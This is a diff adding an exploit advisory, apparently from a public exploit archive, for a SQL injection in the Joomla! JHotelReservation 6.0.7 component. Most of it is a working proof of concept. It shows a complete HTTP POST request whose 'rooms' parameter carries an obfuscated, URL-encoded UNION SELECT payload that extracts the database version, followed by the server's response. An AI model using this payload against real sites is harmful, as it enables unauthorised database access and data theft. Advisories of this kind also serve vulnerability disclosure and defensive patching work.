@@ -1,0 +1,39 @@
+# Exploit Title: Joomla! Component JHotelReservation 6.0.7 - SQL Injection
+# Dork: N/A
+# Date: 2019-01-23
+# Exploit Author: Ihsan Sencan
+# Vendor Homepage: http://cmsjunkie.com/
+# Software Link: https://extensions.joomla.org/extensions/extension/vertical-markets/booking-a-reservations/jhotelreservation/
+# Version: 6.0.7
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: N/A
+
+# POC: 
+# 1)
+# http://localhost/[PATH]/j-myhotel/search-hotels?view=hotels
+# 
+
+POST /[PATH]/j-myhotel/search-hotels?view=hotels HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Cookie: __cfduid=d7fe0824bc450154b7edd5f562e512afc1548262808; c9ffd68b334eb414c880fa254194ecbb=11aaa3e0c1191242b5a84d567379c503; PHPSESSID=75e6cfdbe3676f9393a6114534ed9845
+Alt-Used: TARGET:443
+Connection: keep-alive
+Content-Tye: application/x-www-form-urlencoded
+Content-Length: 965
+task=hotels.searchHotels&year_start=2019&month_start=01&day_start=23&year_end=2019&month_end=01&hotel_id=&day_end=24&rooms=1%20%2f%2a%21%31%31%31%31%31%55%4e%49%4f%4e%2a%2f%20%2f%2a%21%31%31%31%31%31%53%45%4c%45%43%54%2a%2f%20%31%2c%76%65%72%73%69%6f%6e%28%29%2c%33%2c%34%2c%35%2c%36%2c%37%2c%38%2c%39%2c%31%30%2c%31%31%2c%31%32%2c%31%33%2c%31%34%2c%31%35%2c%31%36%2c%31%37%2c%31%38%2c%31%39%2c%32%30%2c%32%31%2c%32%32%2c%32%33%2c%32%34%2c%32%35%2c%32%36%2c%32%37%2c%32%38%2c%32%39%2c%33%30%2c%33%31%2c%33%32%2c%33%33%2c%33%34%2c%33%35%2c%33%36%2c%33%37%2c%33%38%2c%33%39%2c%34%30%2c%34%31%2c%34%32%2c%34%33%2c%34%34%2d%2d%20%2d&guest_adult=2&guest_child=0&filterParams=facilityId%3D1&resetSearch=0'&searchType=&searchId=&priceLow=&priceHigh=&room-guests%5B%5D=2&room-guests-children%5B%5D=0&keyword=Paris&jhotelreservation_datas=23-01-2019&jhotelreservation_datae=24-01-2019&jhotelreservation_rooms=1&jhotelreservation_guest_adult=2&jhotelreservation_guest_child=0
+HTTP/2.0 200 OK
+Date: Wed, 23 Jan 2019 17:04:10 GMT
+Content-Type: text/html; charset=utf-8
+Expires: Wed, 17 Aug 2005 00:00:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Last-Modified: Wed, 23 Jan 2019 17:04:10 GMT
+Server: cloudflare
+CF-RAY: 49dbd67c5d91c820-DFW
+Content-Encoding: gzip
+X-Firefox-Spdy: h2
